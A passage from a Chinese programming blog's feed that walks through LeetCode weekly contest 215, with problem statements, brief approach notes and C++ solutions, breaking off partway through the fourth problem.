class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;vector&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;set&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unordered_set&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unordered_map&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stack&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;meta-string&quot;&gt;&amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;std&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; pair&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;,&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt; pii;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;slove&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; t)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; n,k,s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ans = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;cin&lt;/span&gt;&amp;gt;&amp;gt;n&amp;gt;&amp;gt;k&amp;gt;&amp;gt;s;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ans = k + min(n,k+n&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;*s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;cout&lt;/span&gt;&amp;lt;&amp;lt;ans&amp;lt;&amp;lt;&lt;span class=&quot;built_in&quot;&gt;endl&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; t;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;cin&lt;/span&gt;&amp;gt;&amp;gt;t;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; t; ++i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;cout&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=&quot;string&quot;&gt;&quot;Case #&quot;&lt;/span&gt;&amp;lt;&amp;lt;i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;&lt;span class=&quot;string&quot;&gt;&quot;: &quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        slove(i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="kickstart" scheme="http://yoursite.com/tags/kickstart/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛215场</title>
    <link href="http://yoursite.com/2020/11/15/226/"/>
    <id>http://yoursite.com/2020/11/15/226/</id>
    <published>2020-11-15T10:50:08.297Z</published>
    <updated>2020-11-18T15:48:08.237Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-215"><a href="#leetcode-contest-215" class="headerlink" title="leetcode  contest 215"></a>leetcode  contest 215</h1><p>周赛的题目，前三题比较容易，前三题基本上送分的题目，大概差不多也就40分钟搞定前三题，目测大概也就200名左右，最后一题确实不知道怎么做，直接放弃算了。</p><h2 id="5601-设计有序流"><a href="#5601-设计有序流" class="headerlink" title="5601. 设计有序流"></a>5601. 设计有序流</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>有 n 个 (id, value) 对，其中 id 是 1 到 n 之间的一个整数，value 是一个字符串。不存在 id 相同的两个 (id, value) 对。</p><a id="more"></a><p>设计一个流，以 任意 顺序获取 n 个 (id, value) 对，并在多次调用时 按 id 递增的顺序 返回一些值。</p><p>实现 OrderedStream 类：</p><ul><li><code>OrderedStream(int n)</code> 构造一个能接收 n 个值的流，并将当前指针 <code>ptr</code> 设为 1 。</li><li><code>String[] insert(int id, String value)</code> 向流中存储新的 <code>(id, value)</code>对。存储后：<ul><li>如果流存储有 <code>id = ptr</code>的 (id, value) 对，则找出从 <code>id = ptr</code>开始的 最长 id 连续递增序列 ，并 按顺序 返回与这些 id 关联的值的列表。然后，将 <code>ptr</code>更新为最后那个  id + 1 。</li><li>否则，返回一个空列表。</li></ul></li></ul><p>示例：<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">[<span class="string">"OrderedStream"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>, <span class="string">"insert"</span>]</span><br><span class="line">[[<span class="number">5</span>], [<span class="number">3</span>, <span class="string">"ccccc"</span>], [<span class="number">1</span>, <span class="string">"aaaaa"</span>], [<span class="number">2</span>, <span class="string">"bbbbb"</span>], [<span class="number">5</span>, <span class="string">"eeeee"</span>], [<span class="number">4</span>, <span class="string">"ddddd"</span>]]</span><br><span class="line">输出</span><br><span class="line">[null, [], [<span class="string">"aaaaa"</span>], [<span class="string">"bbbbb"</span>, <span class="string">"ccccc"</span>], [], [<span class="string">"ddddd"</span>, <span class="string">"eeeee"</span>]]</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line"><span class="symbol">OrderedStream</span> os= new <span class="symbol">OrderedStream</span>(<span class="number">5</span>);</span><br><span class="line">os.insert(<span class="number">3</span>, <span class="string">"ccccc"</span>); // 插入 (<span class="number">3</span>, <span class="string">"ccccc"</span>)，返回 []</span><br><span class="line">os.insert(<span class="number">1</span>, <span class="string">"aaaaa"</span>); // 插入 (<span class="number">1</span>, <span class="string">"aaaaa"</span>)，返回 [<span class="string">"aaaaa"</span>]</span><br><span class="line">os.insert(<span class="number">2</span>, <span class="string">"bbbbb"</span>); // 插入 (<span class="number">2</span>, <span class="string">"bbbbb"</span>)，返回 [<span class="string">"bbbbb"</span>, <span class="string">"ccccc"</span>]</span><br><span class="line">os.insert(<span class="number">5</span>, <span class="string">"eeeee"</span>); // 插入 (<span class="number">5</span>, <span class="string">"eeeee"</span>)，返回 []</span><br><span class="line">os.insert(<span class="number">4</span>, <span class="string">"ddddd"</span>); // 插入 (<span class="number">4</span>, <span class="string">"ddddd"</span>)，返回 [<span class="string">"ddddd"</span>, <span class="string">"eeeee"</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 1000</code></li><li><code>1 &lt;= id &lt;= n</code></li><li><code>value.length == 5</code></li><li><code>value</code> 仅由小写字母组成</li><li>每次调用 <code>insert</code> 都会使用一个唯一的 <code>id</code></li><li>恰好调用 <code>n</code> 次 <code>insert</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/design-an-ordered-stream" target="_blank" rel="noopener">https://leetcode-cn.com/problems/design-an-ordered-stream</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>题目太罗嗦了，真心是垃圾题目啊。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderedStream</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    OrderedStream(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;ptr = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;cap = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; insert(<span class="keyword">int</span> id, <span class="built_in">string</span> value) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; ans;</span><br><span class="line">        arr[id] = value;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = ptr; i &lt;= <span class="number">1000</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr.count(i))&#123;</span><br><span class="line">                ans.push_back(arr[i]);</span><br><span class="line">                ptr = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; arr;</span><br><span class="line">    <span class="keyword">int</span> ptr;</span><br><span class="line">    <span class="keyword">int</span> cap;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your OrderedStream object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * OrderedStream* obj = new OrderedStream(n);</span></span><br><span class="line"><span class="comment"> * vector&lt;string&gt; param_1 = obj-&gt;insert(id,value);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5603-确定两个字符串是否接近"><a href="#5603-确定两个字符串是否接近" class="headerlink" title="5603. 确定两个字符串是否接近"></a>5603. 确定两个字符串是否接近</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>如果可以使用以下操作从一个字符串得到另一个字符串，则认为两个字符串 接近 ：</p><ul><li>操作 1：交换任意两个 现有 字符。<ul><li>例如，abcde -&gt; aecdb</li></ul></li><li>操作 2：将一个 现有 字符的每次出现转换为另一个 现有 字符，并对另一个字符执行相同的操作。<ul><li>例如，aacabb -&gt; bbcbaa（所有 a 转化为 b ，而所有的 b 转换为 a ）<br>你可以根据需要对任意一个字符串多次使用这两种操作。</li></ul></li></ul><p>给你两个字符串，word1 和 word2 。如果 word1 和 word2 接近 ，就返回 true ；否则，返回 false 。</p><p>示例 1：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 = <span class="string">"abc"</span>, word2 = <span class="string">"bca"</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：<span class="number">2</span> 次操作从 word1 获得 word2 。</span><br><span class="line">执行操作 <span class="number">1</span>：<span class="string">"abc"</span> -&gt; <span class="string">"acb"</span></span><br><span class="line">执行操作 <span class="number">1</span>：<span class="string">"acb"</span> -&gt; <span class="string">"bca"</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span> = <span class="string">"a"</span>, <span class="attr">word2</span> = <span class="string">"aa"</span></span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：不管执行多少次操作，都无法从 word1 得到 word2 ，反之亦然。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：word1 = <span class="string">"cabbba"</span>, word2 = <span class="string">"abbccc"</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：<span class="number">3</span> 次操作从 word1 获得 word2 。</span><br><span class="line">执行操作 <span class="number">1</span>：<span class="string">"cabbba"</span> -&gt; <span class="string">"caabbb"</span></span><br><span class="line">执行操作 <span class="number">2</span>：<span class="string">"caabbb"</span> -&gt; <span class="string">"baaccc"</span></span><br><span class="line">执行操作 <span class="number">2</span>：<span class="string">"baaccc"</span> -&gt; <span class="string">"abbccc"</span></span><br></pre></td></tr></table></figure><br>示例 4：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="attr">word1</span> = <span class="string">"cabbba"</span>, <span class="attr">word2</span> = <span class="string">"aabbss"</span></span><br><span class="line">输出：<span class="literal">false</span></span><br><span class="line">解释：不管执行多少次操作，都无法从 word1 得到 word2 ，反之亦然。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= word1.length, word2.length &lt;= 105</code></li><li><code>word1</code> 和 <code>word2</code> 仅包含小写英文字母</li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/determine-if-two-strings-are-close" target="_blank" rel="noopener">https://leetcode-cn.com/problems/determine-if-two-strings-are-close</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 排序</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>初看这个题目没有想太明白，后来想明白了，题目有一个是交换字母数量，假设字符中的各个字符的数量和种类都与目标字符串相同，则我们知道肯定可以通过操作<code>1</code>的交换让两个字符串相等。</li><li>首先我们比较字符串的长度是否相等，如果不相等直接返回。</li><li>再次我们比较数目的种类，如果字符的种类有差别也直接返回。</li><li>最后我们比较所有字符出现的次数，因为题目中规定，对于不同的字符，可以进行数量交换，此时我们只需要比较所有字符的统计数量，比较统计数量是否相等即可，因为我们总能通过交换让相同的字符数量变为相等。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">closeStrings</span><span class="params">(<span class="built_in">string</span> word1, <span class="built_in">string</span> word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = word1.size();</span><br><span class="line">        <span class="keyword">int</span> n = word2.size();</span><br><span class="line">        <span class="keyword">if</span>(m != n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt1(<span class="number">26</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt2(<span class="number">26</span>,<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : word1) cnt1[c-<span class="string">'a'</span>]++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : word2) cnt2[c-<span class="string">'a'</span>]++;</span><br><span class="line">        <span class="comment">/*check*/</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[i] == <span class="number">0</span> &amp;&amp; cnt2[i] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[i] != <span class="number">0</span> &amp;&amp; cnt2[i] == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(cnt1.begin(),cnt1.end());</span><br><span class="line">        sort(cnt2.begin(),cnt2.end());</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt1[i] != cnt2[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5602-将-x-减到-0-的最小操作数"><a href="#5602-将-x-减到-0-的最小操作数" class="headerlink" title="5602. 将 x 减到 0 的最小操作数"></a>5602. 将 x 减到 0 的最小操作数</h2><p>给你一个整数数组 <code>nums</code>和一个整数 x 。每一次操作时，你应当移除数组 <code>nums</code>最左边或最右边的元素，然后从 <code>x</code>中减去该元素的值。请注意，需要 修改 数组以供接下来的操作使用。</p><p>如果可以将<code>x</code>恰好 减到 0 ，返回 最小操作数 ；否则，返回 -1 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>], x = <span class="number">5</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：最佳解决方案是移除后两个元素，将 x 减到 <span class="number">0</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>], x = <span class="number">4</span></span><br><span class="line">输出：<span class="number">-1</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">20</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>], x = <span class="number">10</span></span><br><span class="line">输出：<span class="number">5</span></span><br><span class="line">解释：最佳解决方案是移除后三个元素和前两个元素（总共 <span class="number">5</span> 次操作），将 x 减到 <span class="number">0</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 104</code></li><li><code>1 &lt;= x &lt;= 109</code><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><a href="https://leetcode-cn.com/problems/minimum-operations-to-reduce-x-to-zero" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-operations-to-reduce-x-to-zero</a><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 滑动窗口</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3></blockquote></li></ul><ol><li>这个题目非常简单，因为题目中要求只能从数组的头部和尾部取数据，因此我们只需要保证前缀和后缀的和等于<code>x</code>即可，我们只需要求出复合要求的最短的前缀和后缀的长度之和即可为目标，非常常规的题目，没有太多新意。</li><li>我们可以用<code>hash</code>来存储前缀和，我们求后缀和的同时，同时计算<code>x-suffix</code>是否在前缀和中能够查找到。<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minOperations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> ans = n+<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; prefix(n,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/*prefix sum*/</span></span><br><span class="line">        prefix[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        cnt[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i) prefix[i] = prefix[i<span class="number">-1</span>] + nums[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cnt[prefix[i]] = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(cnt.count(x)) ans = cnt[x];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> suffix = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">            suffix += nums[i];</span><br><span class="line">            <span class="keyword">if</span>(cnt.count(x-suffix)) ans = min(ans,n-i + cnt[x-suffix]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans &gt; n ? <span class="number">-1</span> : ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h2 id="5604-最大化网格幸福感"><a href="#5604-最大化网格幸福感" class="headerlink" title="5604. 最大化网格幸福感"></a>5604. 最大化网格幸福感</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>给你四个整数 <code>m、n、introvertsCount 和 extrovertsCount</code>。有一个 <code>m x n</code>网格，和两种类型的人：内向的人和外向的人。总共有 <code>introvertsCount</code> 个内向的人和 